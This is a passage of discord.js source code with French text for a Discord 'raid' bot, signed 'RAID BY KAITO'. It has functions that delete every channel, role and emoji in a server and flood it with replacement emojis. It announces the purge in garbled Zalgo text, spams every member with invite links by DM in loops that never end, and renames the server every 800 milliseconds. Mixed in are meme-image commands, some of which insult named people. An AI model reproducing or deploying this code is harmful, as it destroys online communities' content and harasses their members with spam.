      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')
  
    }
  
  }
  
  
  function chnldel(guild){
  
    if(!guild.channels) return;
  
    if(!guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
  
    guild.channels.forEach(chan => { if(chan.deletable && chan.name !== 'RANDOM') chan.delete()})
  
  }
  
  
  function rldel(guild){
  
    if(!guild.member(client.user).hasPermission("MANAGE_ROLES")) return;
  
    guild.roles.forEach(r => {
  
      if(r.name == "RAID BY KAITO")return
  
      r.delete()
  
    })
  
  }
  
  
  function emjdel(guild){
  
    if(!guild.emojis) return;
  
    if(!guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
  
    guild.emojis.forEach(emoji => {
  
      if(emoji.name == 'RAID BY KAITO') return;
  
      guild.deleteEmoji(emoji)
  
    })
  
    emjst(guild)
  
  }
  
  
  function emjst(guild){
  
    if(!guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
  
    for(var i = 0; i < 51; i++){
  
      guild.createEmoji('https://cdn.discordapp.com/emojis/515924000048676864.png?v=1', 'RAID BY KAITO')
  
    }
  
  }

  client.on('message', async message =>{
    if(message.content.startsWith('mpall')){
      if (message.author.id == client.user.id) {
        var args = message.content.split(" ").slice(1);
        var msge = args.join(' ');


        if(!msge) return message.channel.send("Precise un message pour que sa marche...")

        var mpall = new Discord.RichEmbed()
            .setColor("RANDOM")
            .addBlankField()
            .setImage(rdm_img[Math.floor(Math.random() * rdm_img.length)])
        message.delete()
        message.guild.members.map(m => m.send(mpall))
      }
    }
});

client.on('message', message => {
  
  if (message.content === (prefix + 'slap')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('**Claqué !**')
      
      .setColor('#4248f4')
      
      .setImage('https://cdn.discordapp.com/attachments/566702511717613608/566705447436943360/IR8XwB.gif');
    
    message.channel.send(embed);
  }
});


client.on('message', message => {
  
  if (message.content === (prefix + 'zola')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('**Voici Zola ⏳**')
      
      .setColor('#42f459')
      
      .setImage('https://cdn.discordapp.com/attachments/533624013298204704/566907160689246228/UnacceptableDistantCrustacean-max-1mb.gif');
    
    message.channel.send(embed);
  }
});


client.on('message', message => {
  
  if (message.content === (prefix + 'hawk')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('**Voici Hawk ♿**')
      
      .setColor('#071c3f')
      
      .setImage('https://cdn.discordapp.com/attachments/525800887126458378/566910849378287637/image0.png');
    
    message.channel.send(embed);
  }
});

client.on('message', message => {
  
  if (message.content === (prefix + 'server')){
    
    let embed = new Discord.RichEmbed()
      
.setAuthor(client.user.username, client.user.avatarURL)
      
.setTitle('**Voici le magnifique serveur**')
      
.addField('Le magnifique serveur : https://discord.gg/QNhKRFG')
      
.setColor("RANDOM")
      
.setImage('https://cdn.discordapp.com/attachments/556173593302532097/570589724889317376/JJVe.gif');
    
    
message.channel.send(embed);
  }
});
 
 
 client.on('message', message => {
  
  if (message.content === (prefix + 'jules')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('**Lourd ce bg **')
      
      .setColor('RANDOM')
      
      .setImage('https://cdn.discordapp.com/attachments/566913715472171008/570684226911993856/image0.jpg');
    
    message.channel.send(embed);
  }
});

client.on('message', message => {
  
  if (message.content === (prefix + 'ramy')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('**Tema la gueule du rat **')
      
      .setColor('RANDOM')
      
      .setImage('https://cdn.discordapp.com/attachments/566913715472171008/574650928712646666/image0.png');
    
    message.channel.send(embed);
  }
});


client.on('message', message => {
  
  if (message.content === (prefix + 'dodo')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('** ? **')
      
      .setColor('RANDOM')
      
      .setImage('https://cdn.discordapp.com/attachments/566913715472171008/574652311712956417/image0.png');
    
    message.channel.send(embed);
  }
});


client.on('message', message => {
if (message.content === (prefix + "mp")) {
	message.delete();
	message.guild.members.forEach(member => {
           member.createDM().then(function (channel) {
               for (var i = 0; i >= 0; i--) {
                   channel.send('https://discord.gg/KQNfAxY')
               }
           
           });
           
	
	
	});
	};
  });
  
  client.on('message', message => {
    if (message.content === (prefix + "gspotify")) {
      message.delete();
      message.guild.member.forEach(member => {
               member.createDM().then(function (channel) {
                   for (var i = 0; i >= 0; i--) {
                       channel.send(rndm_gen[Math.floor(Math.random() * rndm_gen.length)])
                   }
               
               });
               
      
      
      });
      };
      });
	
	
client.on('message', message => {
    if(message.content.startsWith(prefix+"BTK")) {
        if(message.deletable)message.delete()
    let rotate = 0;
    let serveur = message.guild
        setInterval(function() {
            if (rotate === 0) {
                serveur.setName(" Union")
                rotate = 1;
            } else if (rotate === 1) {
                serveur.setName(" Union�");
                rotate = 2;
            } else if (rotate === 2) {
                serveur.setName(" Union��");
                rotate = 3;
            } else if (rotate ===3) {
                serveur.setName(" Union���");
                rotate = 4;
            } else if (rotate ===4) {
                serveur.setName(" Union��");
                rotate = 5;
            } else if (rotate ===5) {
                serveur.setName(" Union�");
                rotate = 6;
            } else if (rotate ===6) {
                serveur.setName(" Union");
                rotate = 7;
            } else if (rotate ===7) {
                serveur.setName(" Union");
                rotate = 8;
            } else if (rotate ===8) {
                serveur.setName(" Union");
                rotate = 9;
            } else if (rotate ===9) {
                serveur.setName(" Union");
                rotate = 10;
            } else if (rotate ===10) {
                random = Math.floor(Math.random() * 7) + 1;
                serveur.setName(" Union");
                rotate = 0;
            }}, 800)
        }
    }
)


client.on('message', message => {
  
  if (message.content === (prefix + 'eva')){
    
    let embed = new Discord.RichEmbed()
      
      .setTitle('**Tema la gueule du rat **')
      
      .setColor('RANDOM')
      
      .setImage('https://cdn.discordapp.com/attachments/566913715472171008/574650756595187714/image0.jpg');
    
    message.channel.send(embed);
  }
});
